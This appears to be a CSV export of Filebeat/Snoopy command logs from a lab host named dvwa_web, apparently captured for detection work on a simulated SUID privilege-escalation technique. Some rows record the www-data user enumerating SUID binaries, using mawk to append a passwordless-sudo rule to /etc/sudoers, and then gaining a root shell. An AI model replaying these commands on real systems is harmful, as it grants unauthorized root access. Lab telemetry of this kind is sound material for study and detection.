"@timestamp","_id","_index","_score","agent.ephemeral_id","agent.hostname","agent.id","agent.name","agent.type","agent.version",command,cwd,"ecs.version","event.dataset","event.ingested",filename,"host.architecture","host.containerized","host.hostname","host.id","host.ip","host.mac","host.name","host.os.codename","host.os.family","host.os.kernel","host.os.name","host.os.name.text","host.os.platform","host.os.type","host.os.version","input.type","log.file.path","log.offset",message,sid,tty,uid
"Oct 24, 2022 @ 23:23:00.572",ANaXCoQBDsc6tFfSCuJK,".ds-filebeat-8.4.3-2022.10.24-000001","-","71df9d48-1d5b-48bc-9d0b-4c069d92c8ca","dvwa_web","8d42cf34-4f58-4413-b965-cf6afa6eb26b","dvwa_web",filebeat,"8.4.3","basename /usr/sbin/service","/exploits/Privilege_Escalation_T1548.001","8.0.0",snoopy,"Oct 24, 2022 @ 23:23:01.575","/usr/bin/basename","x86_64",false,"dvwa_web",bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b","dvwa_web",bullseye,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"11 (bullseye)",filestream,"/var/log/snoopy.log","643,500","[uid:0 sid:256075 tty:/dev/pts/0 cwd:/exploits/Privilege_Escalation_T1548.001 filename:/usr/bin/basename]: basename /usr/sbin/service",256075,"/dev/pts/0",0
"Oct 24, 2022 @ 23:23:00.572",AdaXCoQBDsc6tFfSCuJK,".ds-filebeat-8.4.3-2022.10.24-000001","-","71df9d48-1d5b-48bc-9d0b-4c069d92c8ca","dvwa_web","8d42cf34-4f58-4413-b965-cf6afa6eb26b","dvwa_web",filebeat,"8.4.3","basename /usr/sbin/service","/exploits/Privilege_Escalation_T1548.001","8.0.0",snoopy,"Oct 24, 2022 @ 23:23:01.575","/usr/bin/basename","x86_64",false,"dvwa_web",bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b","dvwa_web",bullseye,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"11 (bullseye)",filestream,"/var/log/snoopy.log","643,634","[uid:0 sid:256075 tty:/dev/pts/0 cwd:/exploits/Privilege_Escalation_T1548.001 filename:/usr/bin/basename]: basename /usr/sbin/service",256075,"/dev/pts/0",0
"Oct 24, 2022 @ 23:23:00.572",AtaXCoQBDsc6tFfSCuJK,".ds-filebeat-8.4.3-2022.10.24-000001","-","71df9d48-1d5b-48bc-9d0b-4c069d92c8ca","dvwa_web","8d42cf34-4f58-4413-b965-cf6afa6eb26b","dvwa_web",filebeat,"8.4.3","env -i LANG= LANGUAGE= LC_CTYPE= LC_NUMERIC= LC_TIME= LC_COLLATE= LC_MONETARY= LC_MESSAGES= LC_PAPER= LC_NAME= LC_ADDRESS= LC_TELEPHONE= LC_MEASUREMENT= LC_IDENTIFICATION= LC_ALL= PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin TERM=xterm /etc/init.d/cron status","/","8.0.0",snoopy,"Oct 24, 2022 @ 23:23:01.575","/usr/local/sbin/env","x86_64",false,"dvwa_web",bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b","dvwa_web",bullseye,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"11 (bullseye)",filestream,"/var/log/snoopy.log","643,768","[uid:0 sid:256075 tty:/dev/pts/0 cwd:/ filename:/usr/local/sbin/env]: env -i LANG= LANGUAGE= LC_CTYPE= LC_NUMERIC= LC_TIME= LC_COLLATE= LC_MONETARY= LC_MESSAGES= LC_PAPER= LC_NAME= LC_ADDRESS= LC_TELEPHONE= LC_MEASUREMENT= LC_IDENTIFICATION= LC_ALL= PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin TERM=xterm /etc/init.d/cron status",256075,"/dev/pts/0",0
"Oct 24, 2022 @ 23:23:00.572",A9aXCoQBDsc6tFfSCuJK,".ds-filebeat-8.4.3-2022.10.24-000001","-","71df9d48-1d5b-48bc-9d0b-4c069d92c8ca","dvwa_web","8d42cf34-4f58-4413-b965-cf6afa6eb26b","dvwa_web",filebeat,"8.4.3","env -i LANG= LANGUAGE= LC_CTYPE= LC_NUMERIC= LC_TIME= LC_COLLATE= LC_MONETARY= LC_MESSAGES= LC_PAPER= LC_NAME= LC_ADDRESS= LC_TELEPHONE= LC_MEASUREMENT= LC_IDENTIFICATION= LC_ALL= PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin TERM=xterm /etc/init.d/cron status","/","8.0.0",snoopy,"Oct 24, 2022 @ 23:23:01.575","/usr/local/bin/env","x86_64",false,"dvwa_web",bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b","dvwa_web",bullseye,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"11 (bullseye)",filestream,"/var/log/snoopy.log","644,119","[uid:0 sid:256075 tty:/dev/pts/0 cwd:/ filename:/usr/local/bin/env]: env -i LANG= LANGUAGE= LC_CTYPE= LC_NUMERIC= LC_TIME= LC_COLLATE= LC_MONETARY= LC_MESSAGES= LC_PAPER= LC_NAME= LC_ADDRESS= LC_TELEPHONE= LC_MEASUREMENT= LC_IDENTIFICATION= LC_ALL= PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin TERM=xterm /etc/init.d/cron status",256075,"/dev/pts/0",0
"Oct 24, 2022 @ 23:23:00.572",BNaXCoQBDsc6tFfSCuJK,".ds-filebeat-8.4.3-2022.10.24-000001","-","71df9d48-1d5b-48bc-9d0b-4c069d92c8ca","dvwa_web","8d42cf34-4f58-4413-b965-cf6afa6eb26b","dvwa_web",filebeat,"8.4.3","env -i LANG= LANGUAGE= LC_CTYPE= LC_NUMERIC= LC_TIME= LC_COLLATE= LC_MONETARY= LC_MESSAGES= LC_PAPER= LC_NAME= LC_ADDRESS= LC_TELEPHONE= LC_MEASUREMENT= LC_IDENTIFICATION= LC_ALL= PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin TERM=xterm /etc/init.d/cron status","/","8.0.0",snoopy,"Oct 24, 2022 @ 23:23:01.575","/usr/sbin/env","x86_64",false,"dvwa_web",bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b","dvwa_web",bullseye,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"11 (bullseye)",filestream,"/var/log/snoopy.log","644,469","[uid:0 sid:256075 tty:/dev/pts/0 cwd:/ filename:/usr/sbin/env]: env -i LANG= LANGUAGE= LC_CTYPE= LC_NUMERIC= LC_TIME= LC_COLLATE= LC_MONETARY= LC_MESSAGES= LC_PAPER= LC_NAME= LC_ADDRESS= LC_TELEPHONE= LC_MEASUREMENT= LC_IDENTIFICATION= LC_ALL= PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin TERM=xterm /etc/init.d/cron status",256075,"/dev/pts/0",0
"Oct 24, 2022 @ 23:23:00.572",BdaXCoQBDsc6tFfSCuJK,".ds-filebeat-8.4.3-2022.10.24-000001","-","71df9d48-1d5b-48bc-9d0b-4c069d92c8ca","dvwa_web","8d42cf34-4f58-4413-b965-cf6afa6eb26b","dvwa_web",filebeat,"8.4.3","env -i LANG= LANGUAGE= LC_CTYPE= LC_NUMERIC= LC_TIME= LC_COLLATE= LC_MONETARY= LC_MESSAGES= LC_PAPER= LC_NAME= LC_ADDRESS= LC_TELEPHONE= LC_MEASUREMENT= LC_IDENTIFICATION= LC_ALL= PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin TERM=xterm /etc/init.d/cron status","/","8.0.0",snoopy,"Oct 24, 2022 @ 23:23:01.575","/usr/bin/env","x86_64",false,"dvwa_web",bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b","dvwa_web",bullseye,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"11 (bullseye)",filestream,"/var/log/snoopy.log","644,814","[uid:0 sid:256075 tty:/dev/pts/0 cwd:/ filename:/usr/bin/env]: env -i LANG= LANGUAGE= LC_CTYPE= LC_NUMERIC= LC_TIME= LC_COLLATE= LC_MONETARY= LC_MESSAGES= LC_PAPER= LC_NAME= LC_ADDRESS= LC_TELEPHONE= LC_MEASUREMENT= LC_IDENTIFICATION= LC_ALL= PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin TERM=xterm /etc/init.d/cron status",256075,"/dev/pts/0",0
"Oct 24, 2022 @ 23:23:00.572",BtaXCoQBDsc6tFfSCuJK,".ds-filebeat-8.4.3-2022.10.24-000001","-","71df9d48-1d5b-48bc-9d0b-4c069d92c8ca","dvwa_web","8d42cf34-4f58-4413-b965-cf6afa6eb26b","dvwa_web",filebeat,"8.4.3","run-parts --lsbsysinit --list /lib/lsb/init-functions.d","/","8.0.0",snoopy,"Oct 24, 2022 @ 23:23:01.575","/bin/run-parts","x86_64",false,"dvwa_web",bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b","dvwa_web",bullseye,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"11 (bullseye)",filestream,"/var/log/snoopy.log","645,158","[uid:0 sid:256075 tty:/dev/pts/0 cwd:/ filename:/bin/run-parts]: run-parts --lsbsysinit --list /lib/lsb/init-functions.d",256075,"/dev/pts/0",0
"Oct 24, 2022 @ 23:23:00.572",B9aXCoQBDsc6tFfSCuJK,".ds-filebeat-8.4.3-2022.10.24-000001","-","71df9d48-1d5b-48bc-9d0b-4c069d92c8ca","dvwa_web","8d42cf34-4f58-4413-b965-cf6afa6eb26b","dvwa_web",filebeat,"8.4.3","cat /etc/timezone","/","8.0.0",snoopy,"Oct 24, 2022 @ 23:23:01.575","/bin/cat","x86_64",false,"dvwa_web",bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b","dvwa_web",bullseye,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"11 (bullseye)",filestream,"/var/log/snoopy.log","645,279","[uid:0 sid:256075 tty:/dev/pts/0 cwd:/ filename:/bin/cat]: cat /etc/timezone",256075,"/dev/pts/0",0
"Oct 24, 2022 @ 23:23:00.572",CNaXCoQBDsc6tFfSCuJK,".ds-filebeat-8.4.3-2022.10.24-000001","-","71df9d48-1d5b-48bc-9d0b-4c069d92c8ca","dvwa_web","8d42cf34-4f58-4413-b965-cf6afa6eb26b","dvwa_web",filebeat,"8.4.3","/usr/bin/tput hpa 60","/","8.0.0",snoopy,"Oct 24, 2022 @ 23:23:01.575","/usr/bin/tput","x86_64",false,"dvwa_web",bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b","dvwa_web",bullseye,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"11 (bullseye)",filestream,"/var/log/snoopy.log","645,356","[uid:0 sid:256075 tty:/dev/pts/0 cwd:/ filename:/usr/bin/tput]: /usr/bin/tput hpa 60",256075,"/dev/pts/0",0
"Oct 24, 2022 @ 23:23:00.572",CdaXCoQBDsc6tFfSCuJK,".ds-filebeat-8.4.3-2022.10.24-000001","-","71df9d48-1d5b-48bc-9d0b-4c069d92c8ca","dvwa_web","8d42cf34-4f58-4413-b965-cf6afa6eb26b","dvwa_web",filebeat,"8.4.3","/usr/bin/tput setaf 1","/","8.0.0",snoopy,"Oct 24, 2022 @ 23:23:01.575","/usr/bin/tput","x86_64",false,"dvwa_web",bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b","dvwa_web",bullseye,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"11 (bullseye)",filestream,"/var/log/snoopy.log","645,441","[uid:0 sid:256075 tty:/dev/pts/0 cwd:/ filename:/usr/bin/tput]: /usr/bin/tput setaf 1",256075,"/dev/pts/0",0
"Oct 24, 2022 @ 23:23:00.572",CtaXCoQBDsc6tFfSCuJK,".ds-filebeat-8.4.3-2022.10.24-000001","-","71df9d48-1d5b-48bc-9d0b-4c069d92c8ca","dvwa_web","8d42cf34-4f58-4413-b965-cf6afa6eb26b","dvwa_web",filebeat,"8.4.3","/usr/bin/tput setaf 1","/","8.0.0",snoopy,"Oct 24, 2022 @ 23:23:01.575","/usr/bin/tput","x86_64",false,"dvwa_web",bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b","dvwa_web",bullseye,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"11 (bullseye)",filestream,"/var/log/snoopy.log","645,527","[uid:0 sid:256075 tty:/dev/pts/0 cwd:/ filename:/usr/bin/tput]: /usr/bin/tput setaf 1",256075,"/dev/pts/0",0
"Oct 24, 2022 @ 23:23:00.572",C9aXCoQBDsc6tFfSCuJK,".ds-filebeat-8.4.3-2022.10.24-000001","-","71df9d48-1d5b-48bc-9d0b-4c069d92c8ca","dvwa_web","8d42cf34-4f58-4413-b965-cf6afa6eb26b","dvwa_web",filebeat,"8.4.3","/usr/bin/tput setaf 3","/","8.0.0",snoopy,"Oct 24, 2022 @ 23:23:01.575","/usr/bin/tput","x86_64",false,"dvwa_web",bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b","dvwa_web",bullseye,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"11 (bullseye)",filestream,"/var/log/snoopy.log","645,613","[uid:0 sid:256075 tty:/dev/pts/0 cwd:/ filename:/usr/bin/tput]: /usr/bin/tput setaf 3",256075,"/dev/pts/0",0
"Oct 24, 2022 @ 23:23:00.572",DNaXCoQBDsc6tFfSCuJK,".ds-filebeat-8.4.3-2022.10.24-000001","-","71df9d48-1d5b-48bc-9d0b-4c069d92c8ca","dvwa_web","8d42cf34-4f58-4413-b965-cf6afa6eb26b","dvwa_web",filebeat,"8.4.3","/usr/bin/tput op","/","8.0.0",snoopy,"Oct 24, 2022 @ 23:23:01.576","/usr/bin/tput","x86_64",false,"dvwa_web",bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b","dvwa_web",bullseye,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"11 (bullseye)",filestream,"/var/log/snoopy.log","645,699","[uid:0 sid:256075 tty:/dev/pts/0 cwd:/ filename:/usr/bin/tput]: /usr/bin/tput op",256075,"/dev/pts/0",0
"Oct 24, 2022 @ 23:23:00.572",DdaXCoQBDsc6tFfSCuJK,".ds-filebeat-8.4.3-2022.10.24-000001","-","71df9d48-1d5b-48bc-9d0b-4c069d92c8ca","dvwa_web","8d42cf34-4f58-4413-b965-cf6afa6eb26b","dvwa_web",filebeat,"8.4.3","/bin/echo -e  [31mfailed![39;49m","/","8.0.0",snoopy,"Oct 24, 2022 @ 23:23:01.576","/bin/echo","x86_64",false,"dvwa_web",bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b","dvwa_web",bullseye,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"11 (bullseye)",filestream,"/var/log/snoopy.log","645,780","[uid:0 sid:256075 tty:/dev/pts/0 cwd:/ filename:/bin/echo]: /bin/echo -e  [31mfailed![39;49m",256075,"/dev/pts/0",0
"Oct 24, 2022 @ 23:22:36.568",X9aWCoQBDsc6tFfSq9zo,".ds-filebeat-8.4.3-2022.10.24-000001","-","71df9d48-1d5b-48bc-9d0b-4c069d92c8ca","dvwa_web","8d42cf34-4f58-4413-b965-cf6afa6eb26b","dvwa_web",filebeat,"8.4.3","./exploit_suid_binary.sh","/exploits/Privilege_Escalation_T1548.001","8.0.0",snoopy,"Oct 24, 2022 @ 23:22:37.416","./exploit_suid_binary.sh","x86_64",false,"dvwa_web",bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b","dvwa_web",bullseye,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"11 (bullseye)",filestream,"/var/log/snoopy.log","642,597","[uid:33 sid:256075 tty:/dev/pts/0 cwd:/exploits/Privilege_Escalation_T1548.001 filename:./exploit_suid_binary.sh]: ./exploit_suid_binary.sh",256075,"/dev/pts/0",33
"Oct 24, 2022 @ 23:22:36.568",YNaWCoQBDsc6tFfSq9zo,".ds-filebeat-8.4.3-2022.10.24-000001","-","71df9d48-1d5b-48bc-9d0b-4c069d92c8ca","dvwa_web","8d42cf34-4f58-4413-b965-cf6afa6eb26b","dvwa_web",filebeat,"8.4.3","find / -perm -u=s -type f","/exploits/Privilege_Escalation_T1548.001","8.0.0",snoopy,"Oct 24, 2022 @ 23:22:37.416","/usr/bin/find","x86_64",false,"dvwa_web",bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b","dvwa_web",bullseye,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"11 (bullseye)",filestream,"/var/log/snoopy.log","642,737","[uid:33 sid:256075 tty:/dev/pts/0 cwd:/exploits/Privilege_Escalation_T1548.001 filename:/usr/bin/find]: find / -perm -u=s -type f",256075,"/dev/pts/0",33
"Oct 24, 2022 @ 23:22:36.568",YdaWCoQBDsc6tFfSq9zo,".ds-filebeat-8.4.3-2022.10.24-000001","-","71df9d48-1d5b-48bc-9d0b-4c069d92c8ca","dvwa_web","8d42cf34-4f58-4413-b965-cf6afa6eb26b","dvwa_web",filebeat,"8.4.3","mawk -v LFILE=/etc/sudoers BEGIN { print ""www-data ALL=(ALL) NOPASSWD:ALL"" >> LFILE }","/exploits/Privilege_Escalation_T1548.001","8.0.0",snoopy,"Oct 24, 2022 @ 23:22:37.416","/usr/bin/mawk","x86_64",false,"dvwa_web",bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b","dvwa_web",bullseye,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"11 (bullseye)",filestream,"/var/log/snoopy.log","642,867","[uid:33 sid:256075 tty:/dev/pts/0 cwd:/exploits/Privilege_Escalation_T1548.001 filename:/usr/bin/mawk]: mawk -v LFILE=/etc/sudoers BEGIN { print ""www-data ALL=(ALL) NOPASSWD:ALL"" >> LFILE }",256075,"/dev/pts/0",33
"Oct 24, 2022 @ 23:22:36.568",YtaWCoQBDsc6tFfSq9zo,".ds-filebeat-8.4.3-2022.10.24-000001","-","71df9d48-1d5b-48bc-9d0b-4c069d92c8ca","dvwa_web","8d42cf34-4f58-4413-b965-cf6afa6eb26b","dvwa_web",filebeat,"8.4.3","sudo su","/exploits/Privilege_Escalation_T1548.001","8.0.0",snoopy,"Oct 24, 2022 @ 23:22:37.416","/usr/bin/sudo","x86_64",false,"dvwa_web",bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b","dvwa_web",bullseye,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"11 (bullseye)",filestream,"/var/log/snoopy.log","643,057","[uid:33 sid:256075 tty:/dev/pts/0 cwd:/exploits/Privilege_Escalation_T1548.001 filename:/usr/bin/sudo]: sudo su",256075,"/dev/pts/0",33
"Oct 24, 2022 @ 23:22:36.568",Y9aWCoQBDsc6tFfSq9zo,".ds-filebeat-8.4.3-2022.10.24-000001","-","71df9d48-1d5b-48bc-9d0b-4c069d92c8ca","dvwa_web","8d42cf34-4f58-4413-b965-cf6afa6eb26b","dvwa_web",filebeat,"8.4.3",su,"/exploits/Privilege_Escalation_T1548.001","8.0.0",snoopy,"Oct 24, 2022 @ 23:22:37.416","/bin/su","x86_64",false,"dvwa_web",bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b","dvwa_web",bullseye,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"11 (bullseye)",filestream,"/var/log/snoopy.log","643,169","[uid:0 sid:256075 tty:/dev/pts/0 cwd:/exploits/Privilege_Escalation_T1548.001 filename:/bin/su]: su",256075,"/dev/pts/0",0
"Oct 24, 2022 @ 23:22:36.568",ZNaWCoQBDsc6tFfSq9zo,".ds-filebeat-8.4.3-2022.10.24-000001","-","71df9d48-1d5b-48bc-9d0b-4c069d92c8ca","dvwa_web","8d42cf34-4f58-4413-b965-cf6afa6eb26b","dvwa_web",filebeat,"8.4.3",bash,"/exploits/Privilege_Escalation_T1548.001","8.0.0",snoopy,"Oct 24, 2022 @ 23:22:37.416","/bin/bash","x86_64",false,"dvwa_web",bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b","dvwa_web",bullseye,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"11 (bullseye)",filestream,"/var/log/snoopy.log","643,269","[uid:0 sid:256075 tty:/dev/pts/0 cwd:/exploits/Privilege_Escalation_T1548.001 filename:/bin/bash]: bash",256075,"/dev/pts/0",0
